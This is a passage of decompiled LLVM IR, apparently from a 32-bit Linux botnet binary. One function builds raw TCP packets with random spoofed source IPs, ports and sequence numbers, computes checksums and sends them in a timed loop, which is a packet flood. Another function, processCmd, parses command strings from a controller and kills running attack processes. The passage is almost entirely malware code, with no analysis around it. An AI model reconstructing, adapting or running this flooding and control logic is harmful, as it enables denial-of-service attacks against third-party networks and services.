dec_label_pc_804bfb7:                             ; preds = %dec_label_pc_804bf63
  store i32 %v4_804be8e, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804be8e, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056006.107 to i32), i32* @edi, align 4
  %v7_804bfe7 = call i32 @_strncmp(i8* %v3_804bfb7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056006.107, i32 0, i32 0), i32 4)
  %v8_804bfe7 = urem i32 %v7_804bfe7, 2
  %v9_804bfe7 = icmp eq i32 %v8_804bfe7, 0
  %v0_804bfe9 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bfe9 = or i1 %v0_804bfe9, %v9_804bfe7
  %v3_804bfe9 = zext i1 %v2_804bfe9 to i32
  %v4_804bfe9 = load i32, i32* %edx.global-to-local, align 4
  %v5_804bfe9 = and i32 %v4_804bfe9, -256
  %v6_804bfe9 = or i32 %v3_804bfe9, %v5_804bfe9
  %v7_804bfe9 = xor i32 %v6_804bfe9, 1
  store i32 %v7_804bfe9, i32* @edx, align 4
  %v3_804bfef = and i32 %v7_804bfe7, -256
  %v1_804bff1 = trunc i32 %v7_804bfe9 to i8
  %v3_804bff1 = zext i1 %v0_804bfe9 to i8
  %v4_804bff1 = sub nsw i8 %v1_804bff1, %v3_804bff1
  %v15_804bff1 = icmp eq i8 %v4_804bff1, 0
  %v20_804bff1 = zext i8 %v4_804bff1 to i32
  %v23_804bff1 = or i32 %v20_804bff1, %v3_804bfef
  store i32 %v23_804bff1, i32* @ecx, align 4
  %v2_804bff5 = sext i8 %v4_804bff1 to i32
  store i32 %v2_804bff5, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bffa = icmp eq i1 %v15_804bff1, false
  br i1 %v1_804bffa, label %dec_label_pc_804c009, label %dec_label_pc_804bffc

dec_label_pc_804bffc:                             ; preds = %dec_label_pc_804bfb7
  store i32 %v1_804bd89, i32* @eax, align 4
  %v3_804bfff = load i8, i8* %v2_804bfff, align 1
  %v2_804c003 = or i8 %v3_804bfff, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804c003 = zext i8 %v2_804c003 to i32
  store i32 %v7_804c003, i32* @edx, align 4
  store i8 %v2_804c003, i8* %v2_804bfff, align 1
  br label %dec_label_pc_804c009

dec_label_pc_804c009:                             ; preds = %dec_label_pc_804bfb7, %dec_label_pc_804bfa8, %dec_label_pc_804bf51, %dec_label_pc_804bf06, %dec_label_pc_804bec1, %dec_label_pc_804bffc
  %stack_var_-156.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056006.107, i32 0, i32 0), %dec_label_pc_804bfb7 ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056006.107, i32 0, i32 0), %dec_label_pc_804bffc ], [ %stack_var_-156.125, %dec_label_pc_804bfa8 ], [ %stack_var_-156.125, %dec_label_pc_804bf51 ], [ %stack_var_-156.125, %dec_label_pc_804bf06 ], [ %stack_var_-156.125, %dec_label_pc_804bec1 ]
  %stack_var_-160.0 = phi i32 [ 4, %dec_label_pc_804bfb7 ], [ 4, %dec_label_pc_804bffc ], [ %stack_var_-160.126, %dec_label_pc_804bfa8 ], [ %stack_var_-160.126, %dec_label_pc_804bf51 ], [ %stack_var_-160.126, %dec_label_pc_804bf06 ], [ %stack_var_-160.126, %dec_label_pc_804bec1 ]
  %v0_804c009 = load i32, i32* @esp, align 4
  %v1_804c009 = add i32 %v0_804c009, 4
  %v2_804c009 = inttoptr i32 %v1_804c009 to i32*
  store i32 ptrtoint (i32* @global_var_8055ff4.102 to i32), i32* %v2_804c009, align 4
  %v0_804c011 = load i32, i32* @esp, align 4
  %v1_804c011 = inttoptr i32 %v0_804c011 to i32*
  store i32 0, i32* %v1_804c011, align 4
  %v2_804c018 = ptrtoint i8* %stack_var_-156.0 to i32
  %v3_804c018 = call i32 @__GI_strtok(i32 %stack_var_-160.0, i32 %v2_804c018)
  store i32 %v3_804c018, i32* %eax.global-to-local, align 4
  store i32 %v3_804c018, i32* %tmp90, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804c020 = icmp eq i32 %v3_804c018, 0
  %v1_804c024 = icmp eq i1 %v5_804c020, false
  %tmp91 = inttoptr i32 %v3_804c018 to i8*
  br i1 %v1_804c024, label %dec_label_pc_804be8e, label %dec_label_pc_804c02a

dec_label_pc_804c02a:                             ; preds = %dec_label_pc_804c009, %dec_label_pc_804be73, %dec_label_pc_804be32
  %v0_804c02a = phi i8* [ %v0_804c02a.pre, %dec_label_pc_804be32 ], [ %v5_804be86, %dec_label_pc_804be73 ], [ %tmp91, %dec_label_pc_804c009 ]
  %v1_804c02a = ptrtoint i8* %v0_804c02a to i32
  %v2_804c02a = call i32 @rand_cmwc(i32 %v1_804c02a)
  %v1_804c02f = urem i32 %v2_804c02a, 65536
  store i32 %v1_804c02f, i32* %edx.global-to-local, align 4
  %v1_804c035 = trunc i32 %v2_804c02a to i16
  %v3_804c035 = add i32 %v2_804bd71, 34
  %v4_804c035 = inttoptr i32 %v3_804c035 to i16*
  store i16 %v1_804c035, i16* %v4_804c035, align 2
  %v1_804c03c = add i32 %v2_804bd71, 36
  %v2_804c03c = inttoptr i32 %v1_804c03c to i16*
  store i16 0, i16* %v2_804c03c, align 4
  store i32 %v1_804bd89, i32* %eax.global-to-local, align 4
  %v1_804c045 = add i32 %v2_804bd71, 38
  %v2_804c045 = inttoptr i32 %v1_804c045 to i16*
  store i16 0, i16* %v2_804c045, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804bc6b, label %dec_label_pc_804c05e, label %dec_label_pc_804c051

dec_label_pc_804c051:                             ; preds = %dec_label_pc_804c02a
  %v0_804c051 = load i8*, i8** %stack_var_-20, align 4
  %v1_804c051 = ptrtoint i8* %v0_804c051 to i32
  %v2_804c051 = call i32 @rand_cmwc(i32 %v1_804c051)
  br label %dec_label_pc_804c072

dec_label_pc_804c05e:                             ; preds = %dec_label_pc_804c02a
  %v1_804c061 = urem i32 %arg2, 65536
  store i32 %v1_804c061, i32* %eax.global-to-local, align 4
  %v1_804c064 = load i32, i32* @esp, align 4
  %v2_804c064 = inttoptr i32 %v1_804c064 to i32*
  store i32 %v1_804c061, i32* %v2_804c064, align 4
  %v3_804c067 = call i32 @htons(i16 %tmp38)
  br label %dec_label_pc_804c072

dec_label_pc_804c072:                             ; preds = %dec_label_pc_804c051, %dec_label_pc_804c05e
  %storemerge12.in = phi i32 [ %v2_804c051, %dec_label_pc_804c051 ], [ %v3_804c067, %dec_label_pc_804c05e ]
  %storemerge = trunc i32 %storemerge12.in to i16
  %sext = mul i32 %storemerge12.in, 65536
  %v4_804c075 = sdiv i32 %sext, 65536
  store i32 %v4_804c075, i32* @esi, align 4
  %v3_804c078 = add i32 %v2_804bd71, 22
  %v4_804c078 = inttoptr i32 %v3_804c078 to i16*
  store i16 %storemerge, i16* %v4_804c078, align 2
  %v1_804c07f = load i32, i32* @esp, align 4
  %v2_804c07f = add i32 %v1_804c07f, 4
  %v3_804c07f = inttoptr i32 %v2_804c07f to i32*
  store i32 %v1_804bd89, i32* %v3_804c07f, align 4
  store i32 %v2_804bd71, i32* %eax.global-to-local, align 4
  %v1_804c086 = load i32, i32* @esp, align 4
  %v2_804c086 = inttoptr i32 %v1_804c086 to i32*
  store i32 %v2_804bd71, i32* %v2_804c086, align 4
  %v0_804c089 = call i32 @tcpcsum()
  %v1_804c08e = urem i32 %v0_804c089, 65536
  store i32 %v1_804c08e, i32* %edx.global-to-local, align 4
  %v1_804c094 = trunc i32 %v0_804c089 to i16
  store i16 %v1_804c094, i16* %v2_804c03c, align 4
  store i32 %v2_804bd71, i32* %eax.global-to-local, align 4
  %v1_804c09b = or i32 %v2_804bd71, 2
  %v2_804c09b = inttoptr i32 %v1_804c09b to i16*
  %v3_804c09b = load i16, i16* %v2_804c09b, align 2
  %v4_804c09b = zext i16 %v3_804c09b to i32
  store i32 %v4_804c09b, i32* %edx.global-to-local, align 4
  store i32 %v2_804bd71, i32* %eax.global-to-local, align 4
  %v1_804c0a4 = load i32, i32* @esp, align 4
  %v2_804c0a4 = add i32 %v1_804c0a4, 4
  %v3_804c0a4 = inttoptr i32 %v2_804c0a4 to i32*
  store i32 %v4_804c09b, i32* %v3_804c0a4, align 4
  %v0_804c0a8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c0a8 = load i32, i32* @esp, align 4
  %v2_804c0a8 = inttoptr i32 %v1_804c0a8 to i32*
  store i32 %v0_804c0a8, i32* %v2_804c0a8, align 4
  %v3_804c0ab = inttoptr i32 %v4_804c075 to i16*
  %v4_804c0ab = call i32 @csum(i16* %v3_804c0ab, i32 %v15_804bc50)
  %v1_804c0b0 = urem i32 %v4_804c0ab, 65536
  store i32 %v1_804c0b0, i32* %edx.global-to-local, align 4
  store i32 %v2_804bd71, i32* %eax.global-to-local, align 4
  %v1_804c0b6 = trunc i32 %v4_804c0ab to i16
  %v3_804c0b6 = or i32 %v2_804bd71, 10
  %v4_804c0b6 = inttoptr i32 %v3_804c0b6 to i16*
  store i16 %v1_804c0b6, i16* %v4_804c0b6, align 2
  %v0_804c0ba = load i32, i32* @esp, align 4
  %v1_804c0ba = inttoptr i32 %v0_804c0ba to i32*
  store i32 0, i32* %v1_804c0ba, align 4
  %v2_804c0c1 = inttoptr i32 %v4_804c075 to i32*
  %v3_804c0c1 = call i32 @__GI_time(i32* %v2_804c0c1)
  %v5_804c0c6 = add i32 %v3_804c0c1, %arg3
  %v10_804c0c6 = icmp ult i32 %v5_804c0c6, %v3_804c0c1
  store i1 %v10_804c0c6, i1* %cf.global-to-local, align 1
  store i32 %v5_804c0c6, i32* %eax.global-to-local, align 4
  %v2_804c11d = or i32 %v2_804bd71, 12
  %v3_804c11d = inttoptr i32 %v2_804c11d to i32*
  %v3_804c12b = or i32 %v2_804bd71, 4
  %v4_804c12b = inttoptr i32 %v3_804c12b to i16*
  br label %dec_label_pc_804c0d5

dec_label_pc_804c0d5:                             ; preds = %dec_label_pc_804c199, %dec_label_pc_804c1b6, %dec_label_pc_804c072
  %stack_var_-68.0 = phi i32 [ 0, %dec_label_pc_804c072 ], [ %v4_804c1b6, %dec_label_pc_804c1b6 ], [ 0, %dec_label_pc_804c199 ]
  store i32 %v2_804bd71, i32* %edx.global-to-local, align 4
  %v0_804c0db = load i32, i32* @esp, align 4
  %v1_804c0db = add i32 %v0_804c0db, 20
  %v2_804c0db = inttoptr i32 %v1_804c0db to i32*
  store i32 16, i32* %v2_804c0db, align 4
  %v1_804c0e3 = load i32, i32* @esp, align 4
  %v2_804c0e3 = add i32 %v1_804c0e3, 16
  %v3_804c0e3 = inttoptr i32 %v2_804c0e3 to i32*
  store i32 %v2_804bc90, i32* %v3_804c0e3, align 4
  %v0_804c0e7 = load i32, i32* @esp, align 4
  %v1_804c0e7 = add i32 %v0_804c0e7, 12
  %v2_804c0e7 = inttoptr i32 %v1_804c0e7 to i32*
  store i32 0, i32* %v2_804c0e7, align 4
  store i32 %v1_804bd4d, i32* @edi, align 4
  %v1_804c0f2 = load i32, i32* @esp, align 4
  %v2_804c0f2 = add i32 %v1_804c0f2, 8
  %v3_804c0f2 = inttoptr i32 %v2_804c0f2 to i32*
  store i32 %v1_804bd4d, i32* %v3_804c0f2, align 4
  %v0_804c0f6 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c0f6 = load i32, i32* @esp, align 4
  %v2_804c0f6 = add i32 %v1_804c0f6, 4
  %v3_804c0f6 = inttoptr i32 %v2_804c0f6 to i32*
  store i32 %v0_804c0f6, i32* %v3_804c0f6, align 4
  store i32 %v3_804bcd8, i32* %eax.global-to-local, align 4
  %v1_804c0fd = load i32, i32* @esp, align 4
  %v2_804c0fd = inttoptr i32 %v1_804c0fd to i32*
  store i32 %v3_804bcd8, i32* %v2_804c0fd, align 4
  %v1_804c100 = load i32, i32* %stack_var_-64, align 4
  %v2_804c100 = load i32, i32* %stack_var_-60, align 4
  %v3_804c100 = load i32, i32* %stack_var_-56, align 4
  %v4_804c100 = load i32, i32* %stack_var_-52, align 4
  %v6_804c100 = call i32 @__libc_sendto(i32 %stack_var_-68.0, i32 %v1_804c100, i32 %v2_804c100, i32 %v3_804c100, i32 %v4_804c100, i32 0)
  store i32 %storemerge10, i32* %eax.global-to-local, align 4
  %v1_804c108 = load i32, i32* @esp, align 4
  %v2_804c108 = inttoptr i32 %v1_804c108 to i32*
  store i32 %storemerge10, i32* %v2_804c108, align 4
  %v1_804c10b = load i32, i32* %stack_var_-64, align 4
  %v2_804c10b = call i32 @GetRandomIP(i32 %stack_var_-68.0, i32 %v1_804c10b)
  store i32 %v2_804c10b, i32* %eax.global-to-local, align 4
  %v1_804c110 = load i32, i32* @esp, align 4
  %v2_804c110 = inttoptr i32 %v1_804c110 to i32*
  store i32 %v2_804c10b, i32* %v2_804c110, align 4
  %v0_804c113 = call i32 @htonl()
  store i32 %v0_804c113, i32* %edx.global-to-local, align 4
  store i32 %v2_804bd71, i32* %eax.global-to-local, align 4
  store i32 %v0_804c113, i32* %v3_804c11d, align 4
  %v1_804c120 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %v1_804c125 = urem i32 %v1_804c120, 65536
  store i32 %v1_804c125, i32* %edx.global-to-local, align 4
  store i32 %v2_804bd71, i32* %eax.global-to-local, align 4
  %v1_804c12b = trunc i32 %v1_804c120 to i16
  store i16 %v1_804c12b, i16* %v4_804c12b, align 4
  %v1_804c12f = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  store i32 %v1_804c12f, i32* %edx.global-to-local, align 4
  store i32 %v1_804bd89, i32* %eax.global-to-local, align 4
  store i32 %v1_804c12f, i32* %v3_804bde4, align 8
  %v1_804c13c = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %v1_804c141 = urem i32 %v1_804c13c, 65536
  store i32 %v1_804c141, i32* %edx.global-to-local, align 4
  %v1_804c147 = trunc i32 %v1_804c13c to i16
  store i16 %v1_804c147, i16* %v5_804bd8c, align 4
  store i16 0, i16* %v2_804c03c, align 4
  %v1_804c156 = load i32, i32* @esp, align 4
  %v2_804c156 = add i32 %v1_804c156, 4
  %v3_804c156 = inttoptr i32 %v2_804c156 to i32*
  store i32 %v1_804bd89, i32* %v3_804c156, align 4
  store i32 %v2_804bd71, i32* %eax.global-to-local, align 4
  %v1_804c15d = load i32, i32* @esp, align 4
  %v2_804c15d = inttoptr i32 %v1_804c15d to i32*
  store i32 %v2_804bd71, i32* %v2_804c15d, align 4
  %v0_804c160 = call i32 @tcpcsum()
  %v1_804c165 = urem i32 %v0_804c160, 65536
  store i32 %v1_804c165, i32* %edx.global-to-local, align 4
  %v1_804c16b = trunc i32 %v0_804c160 to i16
  store i16 %v1_804c16b, i16* %v2_804c03c, align 4
  store i32 %v2_804bd71, i32* %eax.global-to-local, align 4
  %v3_804c172 = load i16, i16* %v2_804c09b, align 2
  %v4_804c172 = zext i16 %v3_804c172 to i32
  store i32 %v4_804c172, i32* %edx.global-to-local, align 4
  store i32 %v2_804bd71, i32* %eax.global-to-local, align 4
  %v1_804c17b = load i32, i32* @esp, align 4
  %v2_804c17b = add i32 %v1_804c17b, 4
  %v3_804c17b = inttoptr i32 %v2_804c17b to i32*
  store i32 %v4_804c172, i32* %v3_804c17b, align 4
  %v0_804c17f = load i32, i32* %eax.global-to-local, align 4
  %v1_804c17f = load i32, i32* @esp, align 4
  %v2_804c17f = inttoptr i32 %v1_804c17f to i32*
  store i32 %v0_804c17f, i32* %v2_804c17f, align 4
  %v1_804c182 = load i32, i32* %stack_var_-64, align 4
  %v2_804c182 = inttoptr i32 %stack_var_-68.0 to i16*
  %v3_804c182 = call i32 @csum(i16* %v2_804c182, i32 %v1_804c182)
  %v1_804c187 = urem i32 %v3_804c182, 65536
  store i32 %v1_804c187, i32* %edx.global-to-local, align 4
  %v1_804c18d = trunc i32 %v3_804c182 to i16
  store i16 %v1_804c18d, i16* %v4_804c0b6, align 2
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v10_804c194 = icmp ult i32 %stack_var_-68.0, %arg7
  store i1 %v10_804c194, i1* %cf.global-to-local, align 1
  %v15_804c194 = icmp eq i32 %stack_var_-68.0, %arg7
  %v1_804c197 = icmp eq i1 %v15_804c194, false
  br i1 %v1_804c197, label %dec_label_pc_804c1b6, label %dec_label_pc_804c199

dec_label_pc_804c199:                             ; preds = %dec_label_pc_804c0d5
  %v0_804c199 = load i32, i32* @esp, align 4
  %v1_804c199 = inttoptr i32 %v0_804c199 to i32*
  store i32 0, i32* %v1_804c199, align 4
  %v1_804c1a0 = inttoptr i32 %stack_var_-68.0 to i32*
  %v2_804c1a0 = call i32 @__GI_time(i32* %v1_804c1a0)
  store i32 %v2_804c1a0, i32* %eax.global-to-local, align 4
  %v10_804c1a5 = icmp ult i32 %v2_804c1a0, %v5_804c0c6
  store i1 %v10_804c1a5, i1* %cf.global-to-local, align 1
  %v8_804c1a8 = icmp sgt i32 %v2_804c1a0, %v5_804c0c6
  br i1 %v8_804c1a8, label %dec_label_pc_804c1be, label %dec_label_pc_804c0d5

dec_label_pc_804c1b6:                             ; preds = %dec_label_pc_804c0d5
  %v4_804c1b6 = add i32 %stack_var_-68.0, 1
  br label %dec_label_pc_804c0d5

dec_label_pc_804c1be:                             ; preds = %dec_label_pc_804c199, %dec_label_pc_804bceb, %dec_label_pc_804bcae, %dec_label_pc_804bc90
  %v0_804c1c8 = phi i32 [ %v5_804bd17, %dec_label_pc_804bceb ], [ %v3_804bcd8, %dec_label_pc_804bcae ], [ %v3_804bca0, %dec_label_pc_804bc90 ], [ %v2_804c1a0, %dec_label_pc_804c199 ]
  store i32 %v0_804bc4f, i32* @ebx, align 4
  store i32 %v0_804bc4e, i32* @esi, align 4
  ret i32 %v0_804c1c8

; uselistorder directives
  uselistorder i32 %v3_804c182, { 1, 0 }
  uselistorder i32 %v0_804c160, { 1, 0 }
  uselistorder i32 %v1_804c13c, { 1, 0 }
  uselistorder i32 %v1_804c120, { 1, 0 }
  uselistorder i32 %stack_var_-68.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v5_804c0c6, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804c0c1, { 1, 0 }
  uselistorder i32 %v4_804c0ab, { 1, 0 }
  uselistorder i32 %v0_804c089, { 1, 0 }
  uselistorder i32 %v4_804c075, { 2, 1, 0 }
  uselistorder i32 %v1_804c061, { 1, 0 }
  uselistorder i32 %v2_804c02a, { 1, 0 }
  uselistorder i32 %stack_var_-160.0, { 1, 0 }
  uselistorder i8* %stack_var_-156.0, { 1, 0 }
  uselistorder i1 %v0_804bfe9, { 1, 0 }
  uselistorder i32 %v7_804bfe7, { 1, 0 }
  uselistorder i1 %v0_804bf95, { 1, 0 }
  uselistorder i32 %v7_804bf93, { 1, 0 }
  uselistorder i1 %v0_804bf3e, { 1, 0 }
  uselistorder i32 %v7_804bf3c, { 1, 0 }
  uselistorder i1 %v0_804bef3, { 1, 0 }
  uselistorder i32 %v7_804bef1, { 1, 0 }
  uselistorder i1 %v0_804beae, { 1, 0 }
  uselistorder i32 %v7_804beac, { 1, 0 }
  uselistorder i32 %v4_804be8e, { 1, 0, 3, 2, 5, 4, 7, 6, 8, 9 }
  uselistorder i8* %stack_var_-156.125, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-160.126, { 3, 2, 1, 0 }
  uselistorder i8* %v3_804bfb7, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_804bfff, { 4, 9, 3, 8, 2, 7, 1, 6, 0, 5 }
  uselistorder i8* %v2_804be35, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i1 %v0_804be1f, { 1, 0 }
  uselistorder i32 %v7_804be1d, { 1, 0 }
  uselistorder i32 %v2_804bdcc, { 1, 0 }
  uselistorder i32 %v1_804bd89, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 %v2_804bd71, { 15, 14, 12, 13, 11, 10, 9, 27, 26, 25, 8, 7, 24, 6, 4, 5, 23, 22, 21, 20, 28, 19, 18, 17, 16, 2, 3, 1, 0 }
  uselistorder i32 %v1_804bd4d, { 1, 0, 2 }
  uselistorder i32 %storemerge10, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804bd43, { 1, 0 }
  uselistorder i32 %v3_804bcd8, { 0, 2, 1, 5, 4, 3, 6, 7 }
  uselistorder i32 %v1_804bc7e, { 1, 0 }
  uselistorder i32 %v15_804bc50, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 2, 0, 1, 4, 3 }
  uselistorder i32* %stack_var_-56, { 1, 2, 0 }
  uselistorder i32* %stack_var_-64, { 2, 1, 0, 4, 3 }
  uselistorder i8** %stack_var_-20, { 3, 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %eax.global-to-local, { 28, 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 54, 19, 20, 21, 22, 23, 24, 25, 26, 27, 45, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 41, 40, 42, 43, 44, 47, 46, 49, 48, 51, 50, 52, 53 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 18, 4, 5, 7, 6, 8, 10, 9, 11, 13, 12, 14, 16, 15, 17, 38, 39, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 ()* @tcpcsum, { 1, 0 }
  uselistorder i32 ()* @makeIPPacket, { 1, 0 }
  uselistorder i32 ()* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 0, 2, 1, 3 }
  uselistorder i32 %arg6, { 2, 3, 1, 0 }
  uselistorder i8* %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c0d5, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c072, { 1, 0 }
  uselistorder label %dec_label_pc_804c009, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804be8e, { 1, 0 }
  uselistorder label %dec_label_pc_804bd4a, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_804bc90, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp119 = ptrtoint i32* %arg2 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804c1cc = load i32, i32* @edi, align 4
  %v0_804c1cd = load i32, i32* @esi, align 4
  %v0_804c1ce = load i32, i32* @ebx, align 4
  store i32 %v0_804c1ce, i32* %stack_var_-16, align 4
  %v5_804c1cf = icmp ult i32* %stack_var_-16, inttoptr (i32 300 to i32*)
  store i1 %v5_804c1cf, i1* %cf.global-to-local, align 1
  %v2_804c1d8 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804c1f5 = inttoptr i32 %v2_804c1d8 to i8*
  %v7_804c207 = call i32 @_strncmp(i8* %v4_804c1f5, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805600a.108, i32 0, i32 0), i32 5)
  %v8_804c207 = urem i32 %v7_804c207, 2
  %v9_804c207 = icmp eq i32 %v8_804c207, 0
  %v0_804c209 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c209 = or i1 %v0_804c209, %v9_804c207
  %v3_804c209 = zext i1 %v2_804c209 to i32
  %v4_804c209 = load i32, i32* @edx, align 4
  %v5_804c209 = and i32 %v4_804c209, -256
  %v6_804c209 = or i32 %v3_804c209, %v5_804c209
  %v7_804c209 = xor i32 %v6_804c209, 1
  store i32 %v7_804c209, i32* %edx.global-to-local, align 4
  %v1_804c211 = trunc i32 %v7_804c209 to i8
  %v3_804c211 = zext i1 %v0_804c209 to i8
  %v4_804c211 = sub nsw i8 %v1_804c211, %v3_804c211
  %v15_804c211 = icmp eq i8 %v4_804c211, 0
  %v2_804c215 = sext i8 %v4_804c211 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_804c211, label %dec_label_pc_804cd02, label %dec_label_pc_804c220

dec_label_pc_804c220:                             ; preds = %entry
  %v2_804c223 = load i32, i32* %arg2, align 4
  %v4_804c240 = inttoptr i32 %v2_804c223 to i8*
  %v7_804c252 = call i32 @_strncmp(i8* %v4_804c240, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805600f.109, i32 0, i32 0), i32 6)
  %v8_804c252 = urem i32 %v7_804c252, 2
  %v9_804c252 = icmp eq i32 %v8_804c252, 0
  %v0_804c254 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c254 = or i1 %v0_804c254, %v9_804c252
  %v3_804c254 = zext i1 %v2_804c254 to i32
  %v4_804c254 = load i32, i32* %edx.global-to-local, align 4
  %v5_804c254 = and i32 %v4_804c254, -256
  %v6_804c254 = or i32 %v3_804c254, %v5_804c254
  %v7_804c254 = xor i32 %v6_804c254, 1
  store i32 %v7_804c254, i32* %edx.global-to-local, align 4
  %v1_804c25c = trunc i32 %v7_804c254 to i8
  %v3_804c25c = zext i1 %v0_804c254 to i8
  %v15_804c25c = icmp eq i8 %v1_804c25c, %v3_804c25c
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c265 = icmp eq i1 %v15_804c25c, false
  br i1 %v1_804c265, label %dec_label_pc_804c389, label %dec_label_pc_804c26b

dec_label_pc_804c26b:                             ; preds = %dec_label_pc_804c220
  %v1_804c26e = add i32 %tmp119, 4
  %v5_804c26e = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_804c26e, i1* %cf.global-to-local, align 1
  %v1_804c271 = inttoptr i32 %v1_804c26e to i32*
  %v2_804c271 = load i32, i32* %v1_804c271, align 4
  store i1 false, i1* @df, align 1
  %v4_804c28e = inttoptr i32 %v2_804c271 to i8*
  %v7_804c2a0 = call i32 @_strncmp(i8* %v4_804c28e, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056015.110, i32 0, i32 0), i32 4)
  %v8_804c2a0 = urem i32 %v7_804c2a0, 2
  %v9_804c2a0 = icmp eq i32 %v8_804c2a0, 0
  %v0_804c2a2 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c2a2 = or i1 %v0_804c2a2, %v9_804c2a0
  %v3_804c2a2 = zext i1 %v2_804c2a2 to i32
  %v4_804c2a2 = load i32, i32* %edx.global-to-local, align 4
  %v5_804c2a2 = and i32 %v4_804c2a2, -256
  %v6_804c2a2 = or i32 %v3_804c2a2, %v5_804c2a2
  %v7_804c2a2 = xor i32 %v6_804c2a2, 1
  store i32 %v7_804c2a2, i32* @edx, align 4
  %v1_804c2aa = trunc i32 %v7_804c2a2 to i8
  %v3_804c2aa = zext i1 %v0_804c2a2 to i8
  %v15_804c2aa = icmp eq i8 %v1_804c2aa, %v3_804c2aa
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c2b3 = icmp eq i1 %v15_804c2aa, false
  br i1 %v1_804c2b3, label %dec_label_pc_804c2e1, label %dec_label_pc_804c2b5

dec_label_pc_804c2b5:                             ; preds = %dec_label_pc_804c26b
  %v0_804c2b5 = load i32, i32* @global_var_805e750.111, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c2ba = icmp eq i32 %v0_804c2b5, 0
  br i1 %v1_804c2ba, label %dec_label_pc_804cd02, label %dec_label_pc_804c2c2

dec_label_pc_804c2c2:                             ; preds = %dec_label_pc_804c2b5
  %v2_804c2d2 = call i32 @kill(i32 %v0_804c2b5, i32 9)
  store i32 0, i32* @global_var_805e750.111, align 16
  br label %dec_label_pc_804c2e1

dec_label_pc_804c2e1:                             ; preds = %dec_label_pc_804c26b, %dec_label_pc_804c2c2
  store i1 %v5_804c26e, i1* %cf.global-to-local, align 1
  %v2_804c2e7 = load i32, i32* %v1_804c271, align 4
  store i1 false, i1* @df, align 1
  %v4_804c304 = inttoptr i32 %v2_804c2e7 to i8*
  %v7_804c316 = call i32 @_strncmp(i8* %v4_804c304, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056019.112, i32 0, i32 0), i32 3)
  %v8_804c316 = urem i32 %v7_804c316, 2
  %v9_804c316 = icmp eq i32 %v8_804c316, 0
  %v0_804c318 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c318 = or i1 %v0_804c318, %v9_804c316
  %v3_804c318 = zext i1 %v2_804c318 to i32
  %v4_804c318 = load i32, i32* @edx, align 4
  %v5_804c318 = and i32 %v4_804c318, -256
  %v6_804c318 = or i32 %v3_804c318, %v5_804c318
  %v7_804c318 = xor i32 %v6_804c318, 1
